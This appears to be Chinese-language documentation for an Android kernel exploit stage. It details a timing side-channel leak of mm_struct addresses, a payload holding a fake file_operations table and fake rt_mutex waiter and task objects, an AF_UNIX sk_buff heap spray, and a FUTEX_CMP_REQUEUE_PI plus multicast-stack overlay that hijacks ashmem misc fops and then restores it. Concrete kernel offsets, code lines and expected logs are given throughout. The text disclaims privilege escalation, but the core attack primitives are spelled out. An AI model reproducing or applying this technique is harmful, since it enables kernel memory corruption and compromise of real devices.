# 03. mm/slab、payload、futex/rt_mutex 与 3.1 闭环

本文解释 3.1 路径中的受控观测面：如何定位 order-3 slab，如何构造页内 payload，如何通过 futex/rt_mutex 与 IP multicast side effect 观察 fops route，以及为什么 restore 与 `route-summary` 必须一起看。

这里仍然只讨论探针手法和证据边界。源码里的 `route` 是内部阶段名，不表示鼓励继续拼接利用链；当前包没有提权、持久化、跨机型适配或第二阶段动作。

## mm/slab 定位

`rc_prepare_fops_page()` 用可回收的 `mm_struct` 布局作为定位面：

1. 创建多组 clone child，并打开 `/proc/<pid>/mem`，形成可控数量的 `mm_struct` 与 memfd 引用。
2. 调用 `kernelsnitch_setup(RC_MM_SZ, 3, cpu_count, 8, 0, 0)`，其中 `RC_MM_SZ=0x3c0`，order 为 3，目标碰撞数为 8。
3. `kernelsnitch_find_collisions()` 记录 waiter 计时与 collision scan。
4. `kernelsnitch_bruteforce()` 取回一个 `mm_struct` 邻近地址。
5. `slab_base = leaked & ~0x7fff`，得到 order-3 页基址估计。

关键日志：

```text
[*] prepare_kernel_page geom mode=0 standalone_tcp=0 main_tcp=1 mm_struct_sz=960 objs_per_slab=34 partials=13 collisions=8
[*] kernelsnitch waiters=512 target=... baseline=... threshold=... margin=4 elapsed_ms=...
[*] kernelsnitch collision-scan found=.../... elapsed_ms=...
[*] kernelsnitch collision-scan leaked mm=...
```

`PAGE_PREP_SLABS` 默认是 16。supervisor retry 时会把它改成 32，只扩大预铺规模，不改变 3.1 的技术目标。

## payload 几何

payload buffer 总长 64 KiB，由两份 32 KiB chunk 组成。`RC_IMG_BIAS=0xe80` 是后续 sk_buff copy 的预期落点偏移，因此日志里的 `payload_base` 与 `payload_bias` 必须一起看。

| 名称 | 偏移 | 作用 |
| --- | ---: | --- |
| `RC_FOPS_OFF` | `0x1000` | fake `file_operations` 表 |
| `RC_LOCK_OFF` | `0x1350` | fake `rt_mutex` lock |
| `RC_SCRATCH_OFF` | `0x1700` | configfs write window scratch |
| `RC_W0_OFF` | `0x2220` | fake top waiter |
| `RC_RIGHT_OFF` | `0x4440` | rb-tree 右节点 |
| `RC_LEFT_OFF` | `0x5560` | rb-tree 左节点 |
| `RC_TASK_OFF` | `0x5800` | fake task 最小字段 |

fake fops 表只填 3.1 观测路径会触达的槽位：

| fops slot | 写入值 |
| --- | --- |
| `.llseek` | `fake_w0 + 24` |
| `.read` | `configfs_read_bin_file.cfi_jt` |
| `.write` / `.write_iter` | `configfs_write_bin_file.cfi_jt` |
| `.unlocked_ioctl` | `ashmem_ioctl.cfi_jt` |
| `.compat_ioctl` | `compat_ashmem_ioctl.cfi_jt` |
| `.mmap` | `ashmem_mmap.cfi_jt` |
| `.open` | `ashmem_open.cfi_jt` |
| `.release` | `ashmem_release.cfi_jt` |
| `.splice_read` | `generic_file_splice_read.cfi_jt` |
| `.show_fdinfo` | `ashmem_show_fdinfo.cfi_jt` |

`final payload invariant ok` 只说明用户态 buffer 中两份 chunk 的 lock、waiter、task 与 fops 字段自洽。它不单独证明 kernel 中已落位，也不证明目标槽位已经被写。

## AF_UNIX/sk_buff 喷洒

喷洒参数固定在源码里：

| 常量 | 值 |
| --- | ---: |
| `RC_AF_PAIRS` | `64` |
| `RC_AF_MSGS` | `64` |
| 总发送数 | `4096` |
| payload 长度 | `0x8e80` |

对应日志：

```text
[*] af_unix order3 staged pairs=64 requested=64
[*] sk_buff pcp send ret=65536 errno=0
[*] af_unix order3 spray sent=4096 requested=4096 payload=0x8e80 first_failure_ret=0 first_failure_errno=0
```

`sent=4096 requested=4096` 是喷洒完整性的必要条件之一；如果数量不足，后续 route 证据应降级处理。

## futex/rt_mutex 与 IP multicast side effect

`rc_run_main_route_threads()` 组织三类线程：

- waiter：持有 `rc_f_pi_chain` 后进入 `FUTEX_WAIT_REQUEUE_PI`。
- owner：持有 `rc_f_pi_target`，再尝试锁 `rc_f_pi_chain`，制造 PI chain。
- consumer：等待主线程放行后，对 waiter tid 调用 `sched_setattr()`。

主线程调用：

```c
futex_op(&rc_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &rc_f_pi_target, 0);
```

随后 `rc_slide_ip_stack_copy()` 使用 `setsockopt(MCAST_JOIN_GROUP)` 的内核栈 copy 形成 overlay。当前 overlay 参数会打印出来：

```text
[*] slide ip enter fd=... attempts=1 arm_seq=1 post_hold=20000 group_req_size=0x88 marker_off=0x58 target=x28+0x38 value=... final_fops=1 full_waiter=0 overlay=marker
[*] slide final tree parent=... right=... left=0 pi_write=1
[*] slide ip overlay qwords 20=... 28=... 38=... 50=... 58=... 60=00000000000000ff
[*] slide ip seq=1 ret=... errno=... calls=1 sched_ok=1
[*] slide ip side effect calls=1 sched_ok=1
```

其中 `sched_ok=1` 说明 consumer 侧至少一次 `sched_setattr` 成功，它是 side effect 发生的必要证据之一。`FUTEX_CMP_REQUEUE_PI ret=-1 errno=35` 或 `slide ip seq ret=-1 errno=22` 这类返回值不能按普通成功/失败直觉理解，需要结合 `sched_ok`、overlay 字段和后续 restore 一起判定。

## restore 闭环

3.1 的收尾不是 `route_done=1`，而是 restore 后再汇总。worker 重新打开 ashmem，并通过 fake fops 表中的 configfs write window 写回原始 `ashmem_fops`：

```c
uint64_t misc_fops = text_addr(ASHMEM_MISC_FOPS);
uint64_t original = kaslr_base + ASHMEM_FOPS_OFF;
rc_configfs_write_once(afd, misc_fops, &original, 8);
```

目标槽位来自 `target.h`：

| 符号 | 值 |
| --- | --- |
| `ASHMEM_MISC_FOPS_OFF` | `0x02c84ea8` |
| `KERNEL_DATA_ALIAS_BASE` | `0xffffff8000000000` |
| `ASHMEM_MISC_FOPS_ALIAS` | `0xffffff8002c84ea8` |
| `ASHMEM_FOPS_OFF` | `0x0258fbd8` |

成功日志必须包含：

```text
[*] misc.fops restore target=... original=... ret=8 errno=0
[+] misc.fops restored to ashmem_fops — ashmem safe
[+] route-summary pid=... kaslr=1 base=... slide=... route_done=1
```

若 restore 被跳过、`ret != 8` 或无法打开 ashmem，本次测试存在设备崩溃或后续访问异常风险；应立即保存 stdout/logcat/dmesg，必要时通过“音量下 + 电源键”强制重启恢复。

## 3.1 证据边界

| 日志 | 可以说明 | 不说明 |
| --- | --- | --- |
| `slide-kaslr-perf-ok` | perf 候选 base 被接受 | slab/payload 成功 |
| `kernelsnitch ... leaked mm` | 取到 mm 邻近地址并可估计 order-3 slab | fake 对象已生效 |
| `final payload invariant ok` | 用户态 payload 内部一致 | kernel 内存已经被相同布局覆盖 |
| `spray sent=4096` | sk_buff 喷洒数量完整 | 目标槽位已写 |
| `sched_ok=1` | route 线程侧副作用出现 | restore 已完成 |
| `ret=8 errno=0` | 目标 8 字节 restore 写回完成 | 所有中间阶段都没有抖动 |
| `route_done=1` | worker 到达 3.1 收尾 | 漏洞存在的独立证明、权限变化或第二阶段 |

最强结论来自同一次运行内这些日志的相关性。文档不把其中任一行包装成单独证明，也不把当前探测路径扩展成后续利用链。
